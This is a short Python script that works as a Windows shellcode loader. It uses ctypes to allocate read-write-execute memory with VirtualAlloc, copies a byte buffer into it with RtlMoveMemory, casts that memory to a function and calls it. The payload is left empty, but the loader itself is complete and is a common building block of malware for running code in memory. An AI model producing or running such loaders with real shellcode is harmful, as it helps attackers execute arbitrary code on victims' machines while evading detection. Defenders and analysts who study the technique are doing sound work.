import ctypes

kernel32 = ctypes.windll.kernel32

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
    ctypes.c_void_p,
    ctypes.c_void_p,
    ctypes.c_size_t)

    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40)
    kernel32.RtlMoveMemory(ptr,buf,length) 
    return ptr

def execute(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    shellcode=(b"")
    execute(shellcode)
